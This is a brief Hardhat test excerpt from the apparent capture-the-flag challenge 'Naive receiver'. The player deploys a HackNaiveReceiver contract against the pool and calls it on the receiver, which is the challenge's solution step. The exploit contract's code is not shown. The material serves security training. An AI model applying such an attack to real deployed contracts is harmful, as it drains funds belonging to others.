...
describe("[Challenge] Naive receiver", function () {
  ...
  it("Execution", async function () {
    ...
    const HackNaiveReceiverFactory = await ethers.getContractFactory(
      "HackNaiveReceiver"
    );
    const hackNaiveReceiver = await HackNaiveReceiverFactory.connect(
      player
    ).deploy(pool.address);
    await hackNaiveReceiver.hackNaiveReceiver(receiver.address);
  });
